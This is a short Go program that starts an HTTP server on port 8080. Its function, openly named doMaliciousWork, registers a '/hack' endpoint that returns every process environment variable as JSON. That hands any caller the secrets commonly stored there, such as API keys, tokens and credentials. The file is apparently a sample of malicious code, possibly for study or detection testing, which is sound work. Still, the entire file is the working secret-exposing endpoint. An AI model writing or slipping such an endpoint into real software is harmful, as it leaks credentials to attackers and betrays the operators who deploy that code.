package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
)

func doMaliciousWork() {
	http.HandleFunc("/hack", func(w http.ResponseWriter, r *http.Request) {
		type osENV struct {
			Key   string
			Value string
		}

		envs := make([]osENV, 0)

		for _, elem := range os.Environ() {
			variable := strings.Split(elem, "=")
			envs = append(envs, osENV{Key: variable[0], Value: variable[1]})
		}
		res, _ := json.Marshal(&envs)
		_, err := w.Write(res)
		if err != nil {
			log.Println(err)
		}
	})
}

func main() {
	doMaliciousWork()
	fmt.Println("http://127.0.0.1:8080")
	err := http.ListenAndServe(":8080", nil) //设置监听的端口
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
